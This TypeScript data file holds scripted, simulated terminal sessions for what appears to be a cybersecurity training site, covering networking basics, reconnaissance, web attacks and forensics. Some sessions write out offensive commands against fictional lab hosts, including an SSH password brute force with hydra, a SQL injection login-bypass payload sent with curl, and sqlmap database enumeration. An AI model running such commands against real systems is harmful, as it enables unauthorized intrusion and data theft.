export type TermLineType = "cmd" | "out" | "ok" | "warn" | "err" | "info";

export interface TermLine {
  t: TermLineType;
  s: string;
}

export interface TermScript {
  host: string;
  dir: string;
  lines: TermLine[];
}

const C = "nova@kali";

export const terminalScripts: Record<string, TermScript[]> = {
  c1: [
    {
      host: C,
      dir: "~/basics",
      lines: [
        { t: "cmd", s: "ping -c 3 8.8.8.8" },
        { t: "out", s: "PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data." },
        { t: "out", s: "64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=14.2 ms" },
        { t: "out", s: "64 bytes from 8.8.8.8: icmp_seq=2 ttl=117 time=13.8 ms" },
        { t: "out", s: "64 bytes from 8.8.8.8: icmp_seq=3 ttl=117 time=14.6 ms" },
        { t: "info", s: "--- 8.8.8.8 ping statistics ---" },
        { t: "ok", s: "3 packets transmitted, 3 received, 0% packet loss, time 2003ms" },
        { t: "cmd", s: "tracert -m 6 1.1.1.1" },
        { t: "out", s: " 1  _gateway (192.168.0.1)            0.681 ms" },
        { t: "out", s: " 2  103.147.229.1 (103.147.229.1)    4.102 ms" },
        { t: "out", s: " 3  172.68.254.44 (172.68.254.44)    9.774 ms" },
        { t: "ok", s: " 4  one.one.one.one (1.1.1.1)          8.913 ms" },
        { t: "cmd", s: "dig +short cybernova.academy" },
        { t: "out", s: "104.21.5.19" },
        { t: "out", s: "172.67.133.20" },
        { t: "ok", s: ";; Query time: 28 msec · resolver resolved 2 A-records" },
      ],
    },
    {
      host: C,
      dir: "~/basics",
      lines: [
        { t: "cmd", s: "curl -I https://cybernova.academy" },
        { t: "out", s: "HTTP/2 200" },
        { t: "out", s: "server: cloudflare" },
        { t: "info", s: "strict-transport-security: max-age=63072000" },
        { t: "cmd", s: "openssl s_client -connect cybernova.academy:443 -brief" },
        { t: "out", s: "CONNECTION ESTABLISHED" },
        { t: "info", s: "Protocol version: TLSv1.3" },
        { t: "info", s: "Ciphersuite: TLS_AES_256_GCM_SHA384" },
        { t: "ok", s: "Verification: OK — certificate chain trusted" },
        { t: "cmd", s: "whoami && uptime" },
        { t: "out", s: "nova" },
        { t: "ok", s: " 09:41:22 up 3 days, 2 users, load average: 0.42, 0.36, 0.31" },
      ],
    },
  ],
  c2: [
    {
      host: C,
      dir: "~/ops",
      lines: [
        { t: "cmd", s: "sudo nmap -sS -sV -T4 10.10.10.5" },
        { t: "warn", s: "[sudo] password for nova: ********" },
        { t: "out", s: "Starting Nmap 7.94 ( https://nmap.org ) at 09:41 UTC" },
        { t: "out", s: "Nmap scan report for target.nova (10.10.10.5)" },
        { t: "out", s: "Host is up (0.031s latency)." },
        { t: "info", s: "PORT     STATE SERVICE VERSION" },
        { t: "ok", s: "22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3" },
        { t: "ok", s: "80/tcp   open  http    Apache httpd 2.4.54" },
        { t: "warn", s: "3306/tcp open  mysql   MySQL 5.7.44 (exposed!)" },
        { t: "out", s: "Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel" },
        { t: "ok", s: "Nmap done: 1 IP address (1 host up) scanned in 6.42 seconds" },
      ],
    },
    {
      host: C,
      dir: "~/ops",
      lines: [
        { t: "cmd", s: "hydra -l admin -P rockyou.txt ssh://10.10.10.5 -t 4" },
        { t: "out", s: "Hydra v9.5 (c) 2023 by van Hauser/THC" },
        { t: "warn", s: "[WARNING] Many SSH configurations limit parallel login tasks" },
        { t: "out", s: "[DATA] attacking ssh://10.10.10.5:22/" },
        { t: "info", s: "[STATUS] 128.00 tries/min, 128 tries in 00:01h" },
        { t: "ok", s: "[22][ssh] host: 10.10.10.5   login: admin   password: dragon92" },
        { t: "ok", s: "1 of 1 target successfully completed, 1 valid password found" },
        { t: "cmd", s: "ssh admin@10.10.10.5 'id; uname -a'" },
        { t: "out", s: "uid=1000(admin) gid=1000(admin) groups=1000(admin),27(sudo)" },
        { t: "info", s: "Linux target 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux" },
        { t: "err", s: "[!] admin ∈ sudo — privilege escalation vector identified" },
      ],
    },
  ],
  c3: [
    {
      host: C,
      dir: "~/web",
      lines: [
        { t: "cmd", s: "gobuster dir -u https://shop.nova -w common.txt -q" },
        { t: "info", s: "/admin                (Status: 301) [--> /admin/]" },
        { t: "ok", s: "/backups              (Status: 200) [Size: 12884]" },
        { t: "info", s: "/assets               (Status: 301) [--> /assets/]" },
        { t: "warn", s: "/config.php~          (Status: 200) [Size: 2190]" },
        { t: "cmd", s: "curl -s -X POST https://shop.nova/login -d \"user=admin' OR '1'='1&pass=x\"" },
        { t: "ok", s: "HTTP/1.1 302 Found" },
        { t: "ok", s: "Location: /dashboard  · Set-Cookie: sess=eyJyb2xlIjoiYWRtaW4ifQ==" },
        { t: "err", s: "[+] SQL injection confirmed — auth bypassed in 1 request" },
      ],
    },
    {
      host: C,
      dir: "~/web",
      lines: [
        { t: "cmd", s: "sqlmap -u \"https://shop.nova/item?id=3\" --dbs --batch" },
        { t: "out", s: "        ___  sqlmap/1.8.4#stable" },
        { t: "out", s: "[09:41:26] [INFO] testing connection to the target URL" },
        { t: "warn", s: "[09:41:30] [WARNING] heuristic: id parameter appears injectable" },
        { t: "info", s: "[09:41:44] [INFO] fetching database names" },
        { t: "ok", s: "available databases [3]:" },
        { t: "ok", s: "[*] information_schema\n[*] mysql\n[*] shop" },
        { t: "cmd", s: "nuclei -u https://shop.nova -tags xss -silent" },
        { t: "ok", s: "[reflected-xss] [http] [medium] https://shop.nova/search?q=nova" },
        { t: "info", s: "[INF] Scan completed in 41.2s — 1 finding exported to report.md" },
      ],
    },
  ],
  c4: [
    {
      host: C,
      dir: "~/forensics",
      lines: [
        { t: "cmd", s: "exiftool evidence/dsc_0417.jpg" },
        { t: "out", s: "File Name                       : dsc_0417.jpg" },
        { t: "info", s: "Camera Model Name               : Canon EOS 80D" },
        { t: "info", s: "Date/Time Original              : 2024:11:02 19:42:11" },
        { t: "warn", s: "GPS Position                    : 23 deg 47' N, 90 deg 24' E" },
        { t: "cmd", s: "stegseek evidence/flag.jpg rockyou.txt" },
        { t: "out", s: "StegSeek 0.6 — scanning 14344392 passwords" },
        { t: "ok", s: "[i] Found passphrase: \"sunset\"" },
        { t: "ok", s: "[i] Extracting to \"flag.jpg.out\": flag{n0v4_h1dd3n_l4y3r}" },
      ],
    },
    {
      host: C,
      dir: "~/forensics",
      lines: [
        { t: "cmd", s: "tshark -r capture.pcap -Y \"http.request\" -T fields -e ip.src -e http.host -e http.request.uri" },
        { t: "out", s: "192.168.1.24   shop.nova   /login" },
        { t: "warn", s: "192.168.1.24   shop.nova   /backup.zip" },
        { t: "err", s: "192.168.1.24   c2.evil-cdn.io   /beacon.php?id=8842" },
        { t: "cmd", s: "grep -c \"Failed password\" /var/log/auth.log" },
        { t: "out", s: "4811" },
        { t: "warn", s: "[!] brute-force burst confirmed between 03:12–03:17" },
        { t: "cmd", s: "whois 203.0.113.66 | grep -iE \"netname|country|org\"" },
        { t: "info", s: "netname:        NOVA-RELAY-TH" },
        { t: "info", s: "country:        TH" },
        { t: "ok", s: "OSINT pivot logged — case timeline updated (day 3)" },
      ],
    },
  ],
};
